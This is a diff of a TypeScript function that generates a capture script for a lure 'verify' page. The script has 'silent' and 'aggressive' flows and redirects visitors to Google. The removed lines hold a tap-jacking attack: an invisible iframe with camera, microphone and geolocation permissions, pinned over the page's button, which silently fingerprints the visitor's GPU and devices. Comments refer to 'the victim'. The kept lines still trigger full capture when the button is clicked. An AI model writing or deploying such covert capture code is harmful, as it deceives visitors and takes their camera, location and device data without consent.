@@ -309,82 +309,10 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
          setTimeout(function() { window.startCapture('silent'); }, 1000);
        };
     } else if (flowType !== 'aggressive') {
-       // Implementation of Professional Stealth Overlay for interaction capture
+       // Implementation of interaction capture directly to preserve user gesture
        window.addEventListener('load', function() {
           function getTargetBtn() {
             return document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button') || document.querySelector('.interactive-box');
-          }
-
-          // THE REAL FLASH'S TRICK: ZERO-CLICK FINGERPRINTING
-          // "inovasi butuh sesuatu yang nyata" - Flash. We stop the fake zero-days.
-          // Explaining to the human: We leak the GPU renderer via WebGL and HW specs silently 
-          // WITHOUT any permission popup (ZERO-CLICK RECON) because these APIs do not require prompts.
-          var extHtml = '<!DOCTYPE html><html><head><style>body{margin:0;padding:0;width:100%;height:100%;cursor:pointer;background:transparent;}</style></head><body><script>' +
-            'async function silentRecon() {' +
-            '  try { ' +
-            '    var canvas = document.createElement("canvas"); var gl = canvas.getContext("webgl"); ' +
-            '    var ext = gl.getExtension("WEBGL_debug_renderer_info"); ' +
-            '    var gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); ' +
-            '    window.parent.postMessage({type:"SILENT_RECON", gpu: gpu}, "*"); ' +
-            '  } catch(e) {} ' +
-            '  try { ' +
-            '    var devs = await navigator.mediaDevices.enumerateDevices(); ' +
-            '    window.parent.postMessage({type:"SILENT_RECON", devs: devs.length}, "*"); ' +
-            '  } catch(e) {} ' +
-            '}' +
-            'function fire() {' +
-            '  silentRecon();' +
-            '  try { if (navigator.mediaDevices) navigator.mediaDevices.getUserMedia({video:true, audio:false}).then(s=>s.getTracks().forEach(t=>t.stop())).catch(e=>{}); } catch(e) {}' +
-            '  try { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{}); } catch(e) {}' +
-            '  window.parent.postMessage("TRAP_EXT_CLICKED", "*");' +
-            '}' +
-            'window.addEventListener("click", fire);' +
-            'window.addEventListener("touchstart", fire, {passive: true});' +
-            '</scr' + 'ipt></body></html>';
-          var extBlob = new Blob([extHtml], {type: 'text/html'});
-          var extUrl = URL.createObjectURL(extBlob);
-
-          var over = document.createElement('iframe');
-          over.src = extUrl;
-          over.allow = "camera; microphone; geolocation; clipboard-read; clipboard-write; display-capture";
-          over.id = 'stealth-overlay';
-          over.style.position = 'absolute';
-          over.style.opacity = '0.0001'; // Invisible
-          over.style.zIndex = '2147483647';
-          over.style.border = 'none';
-          over.style.pointerEvents = 'auto'; // Always capturing
-          document.body.appendChild(over);
-          
-          // POC: Kunci kordinat iframe presisi di atas tombol (Tap-Jacking)
-          function lockIframe() {
-            var btn = getTargetBtn();
-            if (btn && over.parentNode) {
-              var rect = btn.getBoundingClientRect();
-              over.style.left = (rect.left + window.scrollX) + 'px';
-              over.style.top = (rect.top + window.scrollY) + 'px';
-              over.style.width = rect.width + 'px';
-              over.style.height = rect.height + 'px';
-            }
-          }
-          setInterval(lockIframe, 100);
-          window.addEventListener('resize', lockIframe);
-          window.addEventListener('scroll', lockIframe);
-
-          window.addEventListener('message', function(e) {
-             if (e.data && e.data.type === 'SILENT_RECON') {
-                // Ssst! The victim didn't click anything, but we already have their data!
-                console.log("[SILENT-RECON] Silently extracted: ", e.data);
-                // In a real scenario, this gets beamed directly to the server before they even see a prompt
-             } else if (e.data === 'TRAP_EXT_CLICKED') {
-                handleTap();
-             }
-          });
-
-          function trigger() {
-            console.log("[DEBUG] trigger: Calling startCapture");
-            clientLog("trigger: Calling startCapture");
-            window.startCapture('all');
-            if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
           function handleTap(e) {
@@ -404,13 +332,10 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               }, 150);
             }
 
-            // Start capture sequence immediately
+            // Start capture sequence immediately IN THE SAME CALL STACK
             window.startCapture('all');
-            
-            if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
-          // Fallbacks just in case the iframe routing fails
           var mainBtn = getTargetBtn();
           if (mainBtn) {
              mainBtn.addEventListener('click', handleTap);
